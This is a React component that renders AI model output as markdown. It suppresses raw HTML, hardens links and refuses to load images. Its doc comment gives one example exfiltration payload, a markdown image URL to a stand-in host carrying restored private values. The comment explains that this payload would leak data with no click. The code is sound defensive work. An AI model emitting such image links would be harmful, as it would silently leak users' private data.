import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";

/**
 * Model output as markdown. Raw HTML is never rendered (react-markdown's default) and links
 * open in a new tab without opener access: this page holds the browser session and a terminal.
 * Images are never loaded: the text has placeholders restored to real values, so `![](https://x/?d=[HIB…])`
 * would send them off the machine with no click. The page's CSP (img-src 'self') blocks that too.
 */
export function Markdown({ text }: { text: string }) {
  return (
    <div className="md">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        components={{
          a: ({ href, children }) => (
            <a href={href} target="_blank" rel="noopener noreferrer">
              {children}
            </a>
          ),
          img: ({ src, alt }) => <span className="muted">[image not loaded{alt ? `: ${alt}` : ""}{src ? ` · ${String(src).slice(0, 120)}` : ""}]</span>,
        }}
      >
        {text}
      </ReactMarkdown>
    </div>
  );
}
